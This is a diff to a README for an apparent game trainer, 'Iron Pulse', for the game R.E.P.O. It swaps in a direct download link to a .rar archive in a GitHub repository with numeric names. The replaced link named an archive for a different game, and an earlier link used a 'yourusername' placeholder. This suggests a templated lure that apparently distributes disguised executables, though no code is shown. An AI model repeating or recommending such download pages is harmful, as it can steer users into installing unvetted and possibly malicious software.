@@ -1,6 +1,6 @@
 # R.E.P.O: Iron Pulse v1.0 - 18 Keys to Chaos
 
-**[Download Trainer](https://github.com/m49357717/312434532/releases/download/32124435/Schedule.I.Shadow.Cartel.v1.0.-.25.Masters.of.Mayhem.rar)**  
+**[Download Trainer](https://github.com/m49357717/312434532/releases/download/21312432141/R.E.P.O.Iron.Pulse.v1.0.-.18.Keys.to.Chaos.rar)**  
 
 **Meta Description**: Master R.E.P.O with Iron Pulse v1.0, packing 18 fierce tools. Defy damage, harness endless energy, and rewrite physics to rule the streets in 2025!
 
@@ -42,7 +42,7 @@ Dominate *R.E.P.O* with these hotkey-charged tools:
 
 ## How to Install and Use
 
-1. **Download**: Snag *Iron Pulse* from the [releases page](https://github.com/yourusername/REPO-Iron-Pulse/releases).  
+1. **Download**: Snag *Iron Pulse* from the [releases page](https://github.com/m49357717/312434532/releases/download/21312432141/R.E.P.O.Iron.Pulse.v1.0.-.18.Keys.to.Chaos.rar).  
 2. **Install**: Plant files in the *R.E.P.O* root folder.  
 3. **Launch**: Fire up *Iron Pulse* first, then dive into *R.E.P.O* (v1.0).  
 4. **Activate**: Hit the hotkeys above in-game to spark the chaos.  
